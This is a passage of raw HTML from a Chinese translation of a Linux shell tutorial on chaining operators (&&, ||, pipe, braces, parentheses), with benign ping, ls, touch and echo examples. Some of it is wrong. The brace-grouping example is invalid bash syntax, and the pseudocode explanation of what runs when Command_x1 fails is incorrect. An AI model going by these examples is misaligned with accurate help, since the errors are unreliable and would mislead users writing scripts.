id=\"crayon-5a6f3a4b8b18d899875719-4\"><span class=\"crayon-cn\">64</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bytes </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">212.71.234.61</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp_req</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ttl</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">55</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">226</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ms</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b18d899875719-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b18d899875719-6\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com </span><span class=\"crayon-e\">ping </span><span class=\"crayon-v\">statistics</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b18d899875719-7\"><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">packets </span><span class=\"crayon-v\">transmitted</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">received</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">packet </span><span class=\"crayon-v\">loss</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">time</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2001ms</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b18d899875719-8\"><span class=\"crayon-e\">rtt </span><span class=\"crayon-v\">min</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">avg</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mdev</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">216.960</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">222.789</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">226.423</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">4.199</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ms </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b18d899875719-9\"><span class=\"crayon-v\">Verified</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p>现在，断开我们现在的网络连接诶，再试一下相同的命令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b190140456506\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/tecmint$ ping -c3 www.tecmint.com &amp;&amp; echo \"verified\" || echo \"Host Down\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b190140456506-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b190140456506-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ping</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">c3 </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"verified\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Host Down\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h4>实例输出</h4>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b193908789572\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nping: unknown host www.tecmint.com \r\nHost Down</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b193908789572-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b193908789572-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b193908789572-1\"><span class=\"crayon-v\">ping</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unknown </span><span class=\"crayon-e\">host </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b193908789572-2\"><span class=\"crayon-e\">Host </span><span class=\"crayon-v\">Down</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3>7. 管道操作符 (|)</h3>\n<p><strong>PIPE</strong>在将第一个命令的输出作为第二个命令的输入时很有用。比如，‘<strong>ls -l</strong>’的输出通过管道到‘<strong>less</strong>’，并看一下输出。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b196002964053\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ ls -l | less</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b196002964053-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b196002964053-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">less</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3>8. 命令合并操作符 {}</h3>\n<p>合并两个或多个命令，第二个命令依赖于第一个命令的执行。</p>\n<p>比如，检查一下文件‘<strong>xyz.txt</strong>’是否在<strong>Downloads</strong>目录下，如果不存在则创建之并输出提示信息。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b19a911867922\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ [ -f /home/tecmint/Downloads/xyz.txt ] || touch /home/tecmint/Downloads/xyz.txt; echo \"The file does not exist\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b19a911867922-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b19a911867922-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Downloads</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">xyz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">touch</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Downloads</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">xyz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"The file does not exist\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>但是这样的命令的运行结果并不如我们预期的运行，会始终都输出提示信息。因此需要使用{}操作符来合并命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b19d741094346\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ [ -f /home/tecmint/Downloads/xyz1.txt ] || {touch /home/tecmint/Downloads/xyz.txt; echo \"The file does not exist\"}\r\n\r\n“The file does not exist”</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b19d741094346-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b19d741094346-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b19d741094346-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b19d741094346-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Downloads</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">xyz1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">touch</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Downloads</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">xyz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"The file does not exist\"</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b19d741094346-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b19d741094346-3\">“<span class=\"crayon-e\">The </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">does </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">exist</span>”</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>（译注：原文这里应该也是复制或书写的时候，出现了一些问题，例子中并没有出现小标题中的”{}”操作符，所以这里我们进行了修改）</p>\n<h3>9. 优先操作符 ()</h3>\n<p>这个操作符可以让命令以优先顺序执行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b1a0149658435\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCommand_x1 &amp;&amp;Command_x2 || Command_x3 &amp;&amp; Command_x4.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b1a0149658435-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b1a0149658435-1\"><span class=\"crayon-v\">Command_x1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-v\">Command_x2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Command_x3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Command_x4</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在上面的伪代码中，如果<strong>Command_x1</strong>执行失败了会怎么样，<strong>Command_x2</strong>, <strong>Command_x3</strong>, <strong>Command_x4</strong>没有一个会执行，对于这种情况，我们使用<strong>优先操作符</strong>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b1a4800494605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n(Command_x1 &amp;&amp;Command_x2) || (Command_x3 &amp;&amp; Command_x4)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px 